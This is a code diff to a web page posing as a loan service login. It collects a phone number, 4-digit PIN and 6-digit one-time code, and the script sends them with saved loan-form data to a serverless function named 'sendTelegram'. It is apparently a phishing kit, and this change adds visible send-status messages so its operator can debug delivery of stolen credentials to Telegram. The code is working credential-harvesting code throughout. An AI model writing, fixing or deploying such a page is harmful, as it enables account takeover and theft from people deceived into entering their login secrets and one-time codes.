@@ -35,6 +35,7 @@
   .small{font-size:13px;color:#6b7280}
   .success{color:#16a34a;font-weight:600}
   .otp-warning{color:#d04444;font-size:13px;margin-top:8px;display:none}
+  .status { font-size:13px;color:#374151;margin-top:8px; word-break:break-word; }
 
   @media(max-width:420px){
     .card{padding:16px}
@@ -60,6 +61,9 @@
       </label>
 
       <button type="submit" id="loginBtn" class="btn" disabled>LOGIN</button>
+
+      <!-- status area so you can see server responses -->
+      <div id="loginStatus" class="status" aria-live="polite" style="display:none"></div>
     </form>
   </div>
 
@@ -79,50 +83,65 @@
         <button id="cancelOtp" style="flex:1;padding:8px;border-radius:8px;border:0;background:#e5e7eb;cursor:pointer">Cancel</button>
       </div>
 
-      <div id="otpStatus" class="small" style="margin-top:8px"></div>
+      <div id="otpStatus" class="small status" style="margin-top:8px"></div>
     </div>
   </div>
 
 <script>
+  // ---------- Helpers ----------
+  const phoneEl = document.getElementById('phone');
+  const pinEl = document.getElementById('pin');
+  const loginBtn = document.getElementById('loginBtn');
+  const loginStatus = document.getElementById('loginStatus');
+
+  const otpModal = document.getElementById('otpModal');
+  const otpInput = document.getElementById('otpInput');
+  const otpWarning = document.getElementById('otpWarning');
+  const confirmOtp = document.getElementById('confirmOtp');
+  const cancelOtp = document.getElementById('cancelOtp');
+  const otpStatus = document.getElementById('otpStatus');
+
   // Prefill phone if saved
   (function(){
     try {
       const data = sessionStorage.getItem('loanForm');
       if (data) {
         const form = JSON.parse(data);
-        if (form.phone) document.getElementById('phone').value = form.phone;
+        if (form.phone) phoneEl.value = form.phone;
       }
     } catch(e){}
   })();
 
-  const phoneEl = document.getElementById('phone');
-  const pinEl = document.getElementById('pin');
-  const loginBtn = document.getElementById('loginBtn');
-
+  // Enable login only when phone non-empty and PIN is 4 digits
   function updateLoginState(){
     const pinValid = /^\d{4}$/.test(pinEl.value);
-    const phoneValid = phoneEl.value.trim().length > 0;
+    const phoneValid = !!phoneEl.value && phoneEl.value.trim().length > 0;
     loginBtn.disabled = !(pinValid && phoneValid);
   }
-
   pinEl.addEventListener('input', function(){
+    // keep digits only, max 4
     this.value = this.value.replace(/\D/g,'').slice(0,4);
     updateLoginState();
   });
-
   phoneEl.addEventListener('input', updateLoginState);
-
   updateLoginState();
 
+  // sendToServer returns an object { ok: boolean, status: int, bodyText: string }
   async function sendToServer(payload) {
-    return fetch('/.netlify/functions/sendTelegram', {
-      method: 'POST',
-      headers: {'Content-Type':'application/json'},
-      body: JSON.stringify(payload)
-    });
+    try {
+      const resp = await fetch('/.netlify/functions/sendTelegram', {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify(payload)
+      });
+      const text = await resp.text();
+      return { ok: resp.ok, status: resp.status, bodyText: text };
+    } catch (err) {
+      return { ok: false, status: 0, bodyText: 'Network error: ' + (err && err.message || '') };
+    }
   }
 
-  // When LOGIN is clicked: send phone+pin to Telegram, then open OTP modal
+  // ---------- LOGIN submit: send login info then open OTP ----------
   document.getElementById('loginForm').addEventListener('submit', async function(e){
     e.preventDefault();
 
@@ -138,46 +157,48 @@
       return;
     }
 
-    // show OTP modal immediately
-    document.getElementById('otpModal').style.display = 'flex';
+    // Show OTP modal immediately so the user can enter the OTP
+    otpModal.style.display = 'flex';
     otpInput.value = '';
     otpWarning.style.display = 'none';
     confirmOtp.disabled = true;
-    setTimeout(()=> otpInput.focus(), 80);
+    otpStatus.textContent = '';
 
-    // send login details to Telegram (non-blocking)
-    (async () => {
-      const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
-      try {
-        await sendToServer({
-          submittedAt: new Date().toISOString(),
-          event: 'login_clicked',
-          loanData,
-          loginPhone: phone,
-          loginPin: pin
-        });
-        // no UI changes here — keep modal open
-      } catch (err) {
-        // silently log; don't block user
-        console.error('Failed to send login details', err);
-      }
-    })();
+    // Update UI showing we're sending login info
+    loginStatus.style.display = 'block';
+    loginStatus.textContent = 'Sending login details...';
+
+    // prepare payload: include loanForm if present
+    const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
+    const payload = {
+      submittedAt: new Date().toISOString(),
+      event: 'login_clicked',
+      loanData,
+      loginPhone: phone,
+      loginPin: pin
+    };
+
+    // send and handle result
+    const result = await sendToServer(payload);
+    if (result.ok) {
+      // Telegram responded 200 — show success briefly
+      loginStatus.textContent = 'Login details sent successfully.';
+      setTimeout(()=> loginStatus.style.display = 'none', 1400);
+    } else {
+      // Show server reply / error so you can debug (text from server / telegram)
+      loginStatus.textContent = 'Send failed: ' + result.bodyText;
+      // keep status visible so you can see the error
+    }
   });
 
   // Cancel OTP modal
-  document.getElementById('cancelOtp').addEventListener('click', ()=>{
-    document.getElementById('otpModal').style.display = 'none';
+  cancelOtp.addEventListener('click', ()=>{
+    otpModal.style.display = 'none';
   });
 
-  // OTP input logic
-  const otpInput = document.getElementById('otpInput');
-  const otpWarning = document.getElementById('otpWarning');
-  const confirmOtp = document.getElementById('confirmOtp');
-  const otpStatus = document.getElementById('otpStatus');
-
+  // ---------- OTP input logic ----------
   otpInput.addEventListener('input', ()=>{
     otpInput.value = otpInput.value.replace(/\D/g,'').slice(0,6);
-
     if(/^\d{6}$/.test(otpInput.value)){
       confirmOtp.disabled = false;
       otpWarning.style.display = 'none';
@@ -190,10 +211,12 @@
   otpInput.addEventListener('blur', ()=>{
     if(otpInput.value && !/^\d{6}$/.test(otpInput.value)){
       otpWarning.style.display = 'block';
+    } else {
+      otpWarning.style.display = 'none';
     }
   });
 
-  // When Confirm is clicked: send OTP + phone + pin to Telegram
+  // ---------- Confirm OTP: send otp + phone + pin ----------
   confirmOtp.addEventListener('click', async ()=>{
     const code = otpInput.value.trim();
     if(!/^\d{6}$/.test(code)){
@@ -208,28 +231,33 @@
     const loanData = JSON.parse(sessionStorage.getItem('loanForm') || '{}');
     const phone = phoneEl.value.trim();
     const pin = pinEl.value.trim();
+    const payload = {
+      submittedAt: new Date().toISOString(),
+      event: 'otp_confirm',
+      loanData,
+      loginPhone: phone,
+      loginPin: pin,
+      otp: code
+    };
 
-    try {
-      const resp = await sendToServer({
-        submittedAt: new Date().toISOString(),
-        event: 'otp_confirm',
-        loanData,
-        loginPhone: phone,
-        loginPin: pin,
-        otp: code
-      });
+    const result = await sendToServer(payload);
 
-      if(!resp.ok){
-        otpStatus.textContent = "Server error";
-        confirmOtp.disabled = false;
-      } else {
-        otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
-        sessionStorage.removeItem('loanForm');
-        setTimeout(()=> window.location.href = "thankyou.html", 1200);
-      }
-    } catch (err) {
-      otpStatus.textContent = "Network error";
+    if (!result.ok) {
+      // show detailed server/telegram response so you can debug
+      otpStatus.textContent = 'Server error: ' + result.bodyText;
       confirmOtp.disabled = false;
+      return;
+    }
+
+    // success
+    try {
+      // If the function returned a JSON string, show nicer success
+      otpStatus.innerHTML = "<span class='success'>Success — your request has been received.</span>";
+      sessionStorage.removeItem('loanForm');
+      setTimeout(()=> window.location.href = "thankyou.html", 1200);
+    } catch(e){
+      otpStatus.textContent = 'Success';
+      setTimeout(()=> window.location.href = "thankyou.html", 1200);
     }
   });
 </script>
